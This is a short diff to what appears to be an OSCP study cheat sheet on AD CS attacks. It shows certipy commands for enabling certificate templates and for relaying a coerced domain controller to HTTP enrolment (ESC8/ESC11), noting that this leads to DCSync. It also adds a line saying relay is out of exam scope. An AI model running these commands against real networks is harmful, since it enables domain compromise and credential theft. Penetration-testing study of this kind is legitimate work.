@@ -38,6 +38,7 @@ certipy ca -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -ad
 certipy ca -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -enable-template '<Template>'
 
 ## ESC8 and ESC11: relay to enrolment
+- [ ] Not on the OSCP exam: relay and coercion are kept out as a safe reading; OffSec's pages do not name them
 The CA's HTTP enrolment takes a relayed machine account: coerce a DC and relay it, :Pb responder.
 certipy relay -target 'http://<DCIP>' -template DomainController
 - [ ] The DC's cert from the relay logs in as the DC, enough for a DCSync
